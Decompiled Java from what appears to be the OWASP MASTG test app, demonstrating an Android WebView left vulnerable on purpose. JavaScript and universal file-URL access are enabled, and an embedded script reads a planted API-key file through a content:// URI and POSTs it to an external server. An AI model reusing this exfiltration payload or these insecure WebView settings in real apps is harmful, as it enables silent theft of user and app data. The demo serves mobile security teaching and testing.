package org.owasp.mastestapp;

import android.content.Context;
import android.webkit.WebSettings;
import android.webkit.WebView;
import java.io.File;
import kotlin.Metadata;
import kotlin.io.FilesKt;
import kotlin.jvm.internal.Intrinsics;

/* compiled from: MastgTestWebView.kt */
@Metadata(d1 = {"\u0000\u001e\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003¢\u0006\u0002\u0010\u0004J\u000e\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\bR\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\t"}, d2 = {"Lorg/owasp/mastestapp/MastgTestWebView;", "", "context", "Landroid/content/Context;", "(Landroid/content/Context;)V", "mastgTest", "", "webView", "Landroid/webkit/WebView;", "app_debug"}, k = 1, mv = {1, 9, 0}, xi = 48)
/* loaded from: classes4.dex */
public final class MastgTestWebView {
    public static final int $stable = 8;
    private final Context context;

    public MastgTestWebView(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        this.context = context;
    }

    public final void mastgTest(WebView webView) {
        Intrinsics.checkNotNullParameter(webView, "webView");
        File sensitiveFile = new File(this.context.getFilesDir(), "api-key.txt");
        FilesKt.writeText$default(sensitiveFile, "MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b", null, 2, null);
        WebSettings $this$mastgTest_u24lambda_u240 = webView.getSettings();
        $this$mastgTest_u24lambda_u240.setJavaScriptEnabled(true);
        $this$mastgTest_u24lambda_u240.setAllowUniversalAccessFromFileURLs(true);
        webView.loadDataWithBaseURL("file:///", "<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <title>MASTG-DEMO-0029</title>\n  </head>\n  <body>\n    <h1>MASTG-DEMO-0029</h1>\n    <p>This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using content:// URIs.</p>\n    <p>The file is located in /data/data/org.owasp.mastestapp/files/</p>\n    <p>NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.</p>\n    <script type=\"text/javascript\">\n      function exfiltrate(data) {\n        \n        var output = document.createElement(\"div\");\n        output.style.color = \"white\";\n        output.style.borderRadius = \"5px\";\n        output.style.backgroundColor = \"red\";\n        output.style.padding = \"1em\";\n        output.style.marginTop = \"1em\";\n        output.innerHTML = \"<strong>Exfiltrated Data:</strong><br>\" + data;\n        document.body.appendChild(output);\n                \n        // Send the text file content to the external server\n        fetch('http://10.0.2.2:5001/receive', {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'text/plain'\n            },\n            body: data\n        })\n        .then(response => console.log('File content sent successfully.'))\n        .catch(err => console.error('Error sending file content:', err));\n      }\n      function readSensitiveFile() {\n        var xhr = new XMLHttpRequest();\n        xhr.onreadystatechange = function() {\n          if (xhr.readyState === 4) {\n            if (xhr.status === 200) {\n              exfiltrate(xhr.responseText);\n            } else {\n              exfiltrate(\"Error reading file: \" + xhr.status);\n            }\n          }\n        };\n        // The injected script accesses the sensitive file via the content provider.\n        xhr.open(\"GET\", \"content://org.owasp.mastestapp.fileprovider/internal_files/api-key.txt\", true);\n        xhr.send();\n      }\n      // Simulate the injected payload triggering.\n      readSensitiveFile();\n    </script>\n  </body>\n</html>", "text/html", "UTF-8", null);
    }
}
